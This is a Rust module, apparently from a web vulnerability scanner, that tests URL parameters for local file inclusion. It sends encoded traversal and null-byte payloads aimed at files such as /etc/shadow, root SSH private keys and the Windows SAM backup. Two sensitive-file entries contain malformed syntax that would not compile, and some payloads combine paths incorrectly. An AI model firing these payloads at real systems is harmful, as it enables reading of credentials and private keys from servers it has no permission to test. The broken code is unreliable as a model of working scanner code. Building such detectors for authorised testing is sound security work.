//! Basic LFI Detection Module
//!
//! Detects LFI using standard directory traversal sequences and null byte truncation.
//! Implements strict validation to differentiate between genuine inclusion and false-positive error messages.

use async_trait::async_trait;
use std::sync::Arc;
use std::time::Duration;
use bytes::Bytes;
use crate::checks::{
    VulnerabilityModule, CheckContext, CheckResult, CheckMetadata, ModuleError,
    CheckCategory, Severity, ResourceBudget
};
use crate::findings::{Finding, Evidence, EvidenceType, EvidenceLocation, Severity as FindingSeverity};
use crate::analysis::AnalysisContext;
use crate::payload::PayloadRegistry;
use crate::http::client::HttpClient;

/// Basic LFI detection module
pub struct BasicLfiModule {
    http_client: Arc<HttpClient>,
    analysis_ctx: Arc<AnalysisContext>,
    payload_registry: Arc<PayloadRegistry>,
    traversal_payloads: Vec<String>,
    sensitive_files: Vec<SensitiveFile>,
}

/// Sensitive file target for LFI
#[derive(Debug, Clone)]
pub struct SensitiveFile {
    pub path: &'static str,
    pub description: &'static str,
    pub severity: FindingSeverity,
    pub detection_patterns: &'static [&'static str],
    pub os: OsType,
}

/// Operating system type
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OsType {
    Linux,
    Windows,
    Both,
}

impl BasicLfiModule {
    pub fn new(
        http_client: Arc<HttpClient>,
        analysis_ctx: Arc<AnalysisContext>,
        payload_registry: Arc<PayloadRegistry>,
    ) -> Self {
        Self {
            http_client,
            analysis_ctx,
            payload_registry,
            traversal_payloads: Self::generate_traversal_payloads(),
            sensitive_files: Self::define_sensitive_files(),
        }
    }

    /// Generate directory traversal payloads
    fn generate_traversal_payloads() -> Vec<String> {
        let mut payloads = Vec::with_capacity(100);
        
        // Basic traversal sequences
        let base_sequences = [
            "../",
            "..\\",
            "..;/",
            "..;\\",
            "....//",
            "....\\\\",
            "..%2f",
            "..%5c",
            "..%252f",
            "..%255c",
            "%2e%2e%2f",
            "%2e%2e%5c",
            "%2e%2e/",
            "%2e%2e\\",
            "..%00",
            "..%00/",
            "..%00\\",
        ];

        // Depth variations (1-10 levels)
        for depth in 1..=10 {
            for seq in &base_sequences {
                let traversal = seq.repeat(depth);
                payloads.push(traversal);
            }
        }

        // Mixed encoding variations
        payloads.extend_from_slice(&[
            "..%2f..%2f..%2f",
            "..%5c..%5c..%5c",
            "..%252f..%252f..%252f",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "..%2f..%5c..%2f",
            "..%5c..%2f..%5c",
            "....//....//....//",
            "....\\\\....\\\\....\\\\",
        ]);

        // Unicode/UTF-8 bypasses
        payloads.extend_from_slice(&[
            "..%c0%af..%c0%af..%c0%af",  // UTF-8 overlong
            "..%e0%80%af..%e0%80%af..%e0%80%af",
            "..%f0%80%80%af..%f0%80%80%af..%f0%80%80%af",
            "..%u002f..%u002f..%u002f",  // Unicode
            "..%u005c..%u005c..%u005c",
        ]);

        // Double encoding
        payloads.extend_from_slice(&[
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252f",
        ]);

        // Null byte injection (for older PHP)
        payloads.extend_from_slice(&[
            "../etc/passwd%00",
            "..\\windows\\win.ini%00",
            "/etc/passwd%00",
            "C:\\windows\\win.ini%00",
            "%00",
            "%00%00",
        ]);

        payloads
    }

    /// Define sensitive files to target
    fn define_sensitive_files() -> Vec<SensitiveFile> {
        vec![
            // Linux/Unix files
            SensitiveFile {
                path: "/etc/passwd",
                description: "User account information",
                severity: FindingSeverity::High,
                detection_patterns: &["root:", "daemon:", "bin:", "sys:", "sync:", "games:", "man:", "lp:", "mail:", "news:", "uucp:", "proxy:", "www-data:", "backup:", "list:", "irc:", "gnats:", "nobody:", "/bin/bash", "/bin/sh", "/usr/sbin/nologin"],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/etc/shadow",
                description: "Password hashes",
                severity: FindingSeverity::Critical,
                detection_patterns: &["root:$", "daemon:$", "bin:$", "sys:$", "$1$", "$5$", "$6$", "$y$", "::"],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/etc/hosts",
                description: "Hostname resolution",
                severity: FindingSeverity::Medium,
                detection_patterns: &["127.0.0.1", "localhost", "::1", "ip6-localhost", "ip6-loopback"],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/etc/hostname",
                description: "System hostname",
                severity: FindingSeverity::Low,
                detection_patterns: &[],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/etc/issue",
                description: "OS version info",
                severity: FindingSeverity::Low,
                detection_patterns: &["Ubuntu", "Debian", "CentOS", "Red Hat", "Fedora", "Alpine", "Linux"],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/etc/os-release",
                description: "OS release info",
                severity: FindingSeverity::Low,
                detection_patterns: &["PRETTY_NAME", "NAME", "VERSION", "ID", "ID_LIKE"],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/proc/version",
                description: "Kernel version",
                severity: FindingSeverity::Medium,
                detection_patterns: &["Linux version", "gcc version", "#1 SMP"],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/proc/self/environ",
                description: "Process environment variables",
                severity: FindingSeverity::High,
                detection_patterns: &["PATH=", "HOME=", "USER=", "SHELL=", "LANG=", "PWD=", "SHLVL="],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/proc/self/cmdline",
                description: "Process command line",
                severity: FindingSeverity::Medium,
                detection_patterns: &[],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/proc/net/tcp",
                description: "Network connections",
                severity: FindingSeverity::Medium,
                detection_patterns: &["sl", "local_address", "rem_address", "st", "tx_queue", "rx_queue"],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/proc/net/udp",
                description: "UDP connections",
                severity: FindingSeverity::Medium,
                detection_patterns: &["sl", "local_address", "rem_address", "st"],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/var/log/apache2/access.log",
                description: "Apache access logs",
                severity: FindingSeverity::Medium,
                detection_patterns: &["GET ", "POST ", "HTTP/1.1", "HTTP/2", "\" 200 ", "\" 404 ", "\" 500 "],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/var/log/nginx/access.log",
                description: "Nginx access logs",
                severity: FindingSeverity::Medium,
                detection_patterns: &["GET ", "POST ", "HTTP/1.1", "HTTP/2", "\" 200 ", "\" 404 ", "\" 500 "],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/var/log/httpd/access_log",
                description: "Apache access logs (RHEL)",
                severity: FindingSeverity::Medium,
                detection_patterns: &["GET ", "POST ", "HTTP/1.1", "HTTP/2", "\" 200 ", "\" 404 ", "\" 500 "],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/var/log/auth.log",
                description: "Authentication logs",
                severity: FindingSeverity::High,
                detection_patterns: &["sshd", "Accepted password", "Failed password", "Invalid user", "pam_unix"],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/var/log/syslog",
                description: "System logs",
                severity: FindingSeverity::Medium,
                detection_patterns: &["systemd", "kernel", "cron", "sudo", "sshd"],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/root/.ssh/id_rsa",
                description: "Root SSH private key",
                severity: FindingSeverity::Critical,
                detection_patterns: &["-----BEGIN RSA PRIVATE KEY-----", "-----BEGIN OPENSSH PRIVATE KEY-----", "-----BEGIN PRIVATE KEY-----"],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/home/*/.ssh/id_rsa",
                description: "User SSH private keys",
                severity: FindingSeverity::Critical,
                detection_patterns: &["-----BEGIN RSA PRIVATE KEY-----", "-----BEGIN OPENSSH PRIVATE KEY-----", "-----BEGIN PRIVATE KEY-----"],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/etc/ssh/sshd_config",
                description: "SSH daemon config",
                severity: FindingSeverity::High,
                detection_patterns: &["Port", "PermitRootLogin", "PubkeyAuthentication", "PasswordAuthentication", "AuthorizedKeysFile"],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/etc/sudoers",
                description: "Sudo configuration",
                severity: FindingSeverity::High,
                detection_patterns: &["root\tALL", "%sudo", "%wheel", "NOPASSWD", "ALL=(ALL)"],
                os: OsType::Linux,
            },
            SensitiveFile {
                path: "/etc/crontab",
                description: "System cron jobs",
                severity: FindingSeverity::Medium,
                detection_patterns: &["SHELL=", "PATH=", "MAILTO=", "# m h", "root\t"],
                os: OsType::Linux,
            },
            
            // Windows files
            SensitiveFile {
                path: "C:\\Windows\\System32\\drivers\\etc\\hosts",
                description: "Windows hosts file",
                severity: FindingSeverity::Medium,
                detection_patterns: &["127.0.0.1", "localhost", "::1"],
                os: OsType::Windows,
            },
            SensitiveFile {
                path: "C:\\Windows\\win.ini",
                description: "Windows initialization",
                severity: FindingSeverity::Low,
                detection_patterns: &["[fonts]", "[extensions]", "[mci extensions]", "run=", "load="],
                os: OsType::Windows,
            },
            SensitiveFile {
                path: "C:\\boot.ini",
                description: "Boot configuration",
                severity: FindingSeverity::Medium,
                detection_patterns: &="[boot loader]", "[operating systems]", "multi(0)disk(0)rdisk(0)partition", "WINDOWS=",
                os: OsType::Windows,
            },
            SensitiveFile {
                path: "C:\\Windows\\system.ini",
                description: "System initialization",
                severity: FindingSeverity::Low,
                detection_patterns: &["[boot]", "[386Enh]", "shell=", "drivers="],
                os: OsType::Windows,
            },
            SensitiveFile {
                path: "C:\\Windows\\repair\\sam",
                description: "SAM backup (password hashes)",
                severity: FindingSeverity::Critical,
                detection_patterns: &[],
                os: OsType::Windows,
            },
            SensitiveFile {
                path: "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log",
                description: "IIS access logs",
                severity: FindingSeverity::Medium,
                detection_patterns: &["GET ", "POST ", "HTTP/1.1", "200 ", "404 ", "500 "],
                os: OsType::Windows,
            },
            SensitiveFile {
                path: "C:\\Program Files\\MySQL\\MySQL Server*\\my.ini",
                description: "MySQL configuration",
                severity: FindingSeverity::High,
                detection_patterns: &="[mysqld]", "port=", "datadir=", "basedir=", "socket=",
                os: OsType::Windows,
            },
            SensitiveFile {
                path: "C:\\xampp\\apache\\logs\\access.log",
                description: "XAMPP Apache logs",
                severity: FindingSeverity::Medium,
                detection_patterns: &["GET ", "POST ", "HTTP/1.1", "200 ", "404 ", "500 "],
                os: OsType::Windows,
            },
        ]
    }

    /// Test LFI payload against a parameter
    async fn test_lfi(
        &self,
        ctx: &CheckContext,
        param_name: &str,
        traversal: &str,
        file: &SensitiveFile,
    ) -> Result<Option<Finding>, ModuleError> {
        let payload = format!("{}{}", traversal, file.path);
        let test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(&payload));
        
        let response = self.http_client
            .get(&test_url)
            .timeout(Duration::from_millis(5000))
            .send()
            .await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let status = response.status().as_u16();
        let headers: Vec<(String, String)> = response
            .headers()
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();
        let body = response.bytes().await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        // Check if file content is in response
        if self.is_file_included(&body, file) {
            // Additional validation: check for false positives
            if self.is_false_positive(&body, &headers, status, file) {
                return Ok(None);
            }

            let evidence = self.create_evidence(&test_url, &body, &headers, status, &payload, file);
            let finding = Finding::new(
                "basic_lfi",
                file.severity,
                "Local File Inclusion",
                format!("LFI detected via parameter '{}' accessing {}", param_name, file.description),
                &ctx.target_url,
            )
            .with_method("GET")
            .with_payload(payload)
            .with_evidence(evidence)
            .with_confidence(85)
            .with_tags(vec!["lfi", "file-inclusion", "traversal", file.os.to_string().to_lowercase()])
            .with_cwe("CWE-22")
            .with_agent_id(ctx.agent_id);

            return Ok(Some(finding));
        }

        Ok(None)
    }

    /// Check if sensitive file content is in response
    fn is_file_included(&self, body: &Bytes, file: &SensitiveFile) -> bool {
        let body_str = String::from_utf8_lossy(body);
        
        // Check for detection patterns
        for pattern in file.detection_patterns {
            if body_str.contains(pattern) {
                return true;
            }
        }

        // For files without specific patterns, check for non-empty response
        // that looks like file content (not error page)
        if file.detection_patterns.is_empty() && body.len() > 50 {
            // Check it's not a generic error page
            let error_indicators = [
                "404", "not found", "error", "exception", "stack trace",
                "warning", "fatal error", "parse error", "syntax error",
                "access denied", "forbidden", "unauthorized",
            ];
            
            let is_error = error_indicators.iter().any(|e| body_str.to_lowercase().contains(e));
            if !is_error && body_str.len() > 100 {
                return true;
            }
        }

        false
    }

    /// Check for false positive indicators
    fn is_false_positive(&self, body: &Bytes, headers: &[(String, String)], status: u16, file: &SensitiveFile) -> bool {
        let body_str = String::from_utf8_lossy(body);
        
        // Check for common false positive patterns
        let false_positive_patterns = [
            "file not found",
            "no such file",
            "failed to open stream",
            "permission denied",
            "access denied",
            "forbidden",
            "unauthorized",
            "internal server error",
            "service unavailable",
            "bad gateway",
            "gateway timeout",
            "the system cannot find the path specified",
            "cannot find the file specified",
            "path not found",
            "file does not exist",
        ];

        for pattern in &false_positive_patterns {
            if body_str.to_lowercase().contains(pattern) {
                return true;
            }
        }

        // Check for error status codes with minimal content
        if status >= 400 && body.len() < 500 {
            return true;
        }

        // Check for generic error pages
        let error_page_indicators = [
            "<html><head><title>error</title>",
            "<html><head><title>404</title>",
            "<html><head><title>500</title>",
            "nginx error page",
            "apache error page",
            "iis error page",
            "tomcat error page",
            "jetty error page",
        ];

        for indicator in &error_page_indicators {
            if body_str.to_lowercase().contains(indicator) {
                return true;
            }
        }

        // Check content-type for error pages
        for (name, value) in headers {
            if name.to_lowercase() == "content-type" {
                let ct = value.to_lowercase();
                if ct.contains("text/html") && body_str.contains("<html") && body_str.len() < 2000 {
                    // Could be error page, but not definitive
                }
            }
        }

        false
    }

    /// Create evidence for LFI finding
    fn create_evidence(
        &self,
        test_url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        payload: &str,
        file: &SensitiveFile,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("GET {} HTTP/1.1", test_url);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("LFI: file={}, os={:?}, payload='{}', status={}, bytes={}", 
                file.path, file.os, payload, status, body.len()),
            location: EvidenceLocation {
                path: test_url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 85,
        }
    }
}

#[async_trait]
impl VulnerabilityModule for BasicLfiModule {
    async fn init(&mut self) -> Result<(), ModuleError> {
        tracing::info!("Basic LFI module initialized with {} traversal payloads and {} sensitive files", 
            self.traversal_payloads.len(), self.sensitive_files.len());
        Ok(())
    }

    fn metadata(&self) -> &CheckMetadata {
        static METADATA: std::sync::OnceLock<CheckMetadata> = std::sync::OnceLock::new();
        METADATA.get_or_init(|| {
            CheckMetadata::new(
                "basic_lfi",
                "Basic Local File Inclusion",
                "Detects LFI using standard directory traversal sequences and null byte truncation",
                Severity::High,
                CheckCategory::PathTraversal,
            )
            .with_budget(ResourceBudget::safe())
            .with_tags(vec!["lfi", "file-inclusion", "traversal", "null-byte", "path-traversal"])
            .with_references(vec![
                "https://owasp.org/www-community/attacks/Path_Traversal",
                "https://cwe.mitre.org/data/definitions/22.html",
                "https://portswigger.net/web-security/file-path-traversal",
            ])
        })
    }

    fn should_run(&self, ctx: &CheckContext) -> bool {
        ctx.target_url.contains('?') || ctx.target_url.contains('=')
    }

    async fn run(&self, ctx: CheckContext) -> Result<CheckResult, ModuleError> {
        let mut findings = Vec::new();
        let mut request_count = 0;
        let max_requests = ctx.budget.max_requests.min(200);

        // Extract parameters
        let params = self.extract_parameters(&ctx.target_url);
        
        if params.is_empty() {
            return Ok(CheckResult {
                findings,
                executed: true,
                timed_out: false,
                resource_usage: Default::default(),
            });
        }

        // Test each traversal payload against each sensitive file
        for file in &self.sensitive_files {
            for traversal in &self.traversal_payloads {
                for param in &params {
                    if request_count >= max_requests {
                        break;
                    }

                    if let Some(finding) = self.test_lfi(&ctx, param, traversal, file).await? {
                        findings.push(finding);
                    }
                    request_count += 1;
                }
            }
        }

        Ok(CheckResult {
            findings,
            executed: true,
            timed_out: false,
            resource_usage: Default::default(),
        })
    }

    fn priority(&self) -> u16 {
        15 // High priority - safe check
    }

    fn dependencies(&self) -> &[&str] {
        &[]
    }
}

impl BasicLfiModule {
    /// Extract parameter names from URL
    fn extract_parameters(&self, url: &str) -> Vec<String> {
        let mut params = Vec::new();
        
        if let Some(query_start) = url.find('?') {
            let query = &url[query_start + 1..];
            for pair in query.split('&') {
                if let Some(eq_pos) = pair.find('=') {
                    let param = &pair[..eq_pos];
                    if !param.is_empty() {
                        params.push(param.to_string());
                    }
                }
            }
        }
        
        if let Ok(parsed) = url::Url::parse(url) {
            for segment in parsed.path_segments().unwrap_or_default() {
                if segment.starts_with(':') || segment.starts_with('{') {
                    params.push(segment.trim_start_matches(':').trim_start_matches('{').trim_end_matches('}').to_string());
                }
            }
        }
        
        params
    }
}

impl std::fmt::Display for OsType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            OsType::Linux => write!(f, "linux"),
            OsType::Windows => write!(f, "windows"),
            OsType::Both => write!(f, "both"),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_traversal_payloads() {
        let payloads = BasicLfiModule::generate_traversal_payloads();
        
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("../")));
        assert!(payloads.iter().any(|p| p.contains("..\\")));
        assert!(payloads.iter().any(|p| p.contains("%2f")));
        assert!(payloads.iter().any(|p| p.contains("%5c")));
        assert!(payloads.iter().any(|p| p.contains("%00")));
    }

    #[test]
    fn test_define_sensitive_files() {
        let files = BasicLfiModule::define_sensitive_files();
        
        assert!(!files.is_empty());
        assert!(files.iter().any(|f| f.path == "/etc/passwd"));
        assert!(files.iter().any(|f| f.path == "/etc/shadow"));
        assert!(files.iter().any(|f| f.path.contains("C:\\Windows")));
        assert!(files.iter().any(|f| f.severity == FindingSeverity::Critical));
    }

    #[test]
    fn test_is_file_included_passwd() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = BasicLfiModule::new(http_client, analysis_ctx, payload_registry);
        
        let file = module.sensitive_files.iter().find(|f| f.path == "/etc/passwd").unwrap();
        let body = Bytes::from("root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin");
        
        assert!(module.is_file_included(&body, file));
    }

    #[test]
    fn test_is_file_included_shadow() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = BasicLfiModule::new(http_client, analysis_ctx, payload_registry);
        
        let file = module.sensitive_files.iter().find(|f| f.path == "/etc/shadow").unwrap();
        let body = Bytes::from("root:$6$salt$hash:18000:0:99999:7:::");
        
        assert!(module.is_file_included(&body, file));
    }

    #[test]
    fn test_is_false_positive() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = BasicLfiModule::new(http_client, analysis_ctx, payload_registry);
        
        let file = module.sensitive_files.iter().find(|f| f.path == "/etc/passwd").unwrap();
        let body = Bytes::from("File not found: /etc/passwd");
        let headers = vec![];
        
        assert!(module.is_false_positive(&body, &headers, 404, file));
    }

    #[test]
    fn test_extract_parameters() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = BasicLfiModule::new(http_client, analysis_ctx, payload_registry);
        
        let params = module.extract_parameters("http://example.com/api?file=test&path=docs");
        assert_eq!(params, vec!["file", "path"]);
    }
}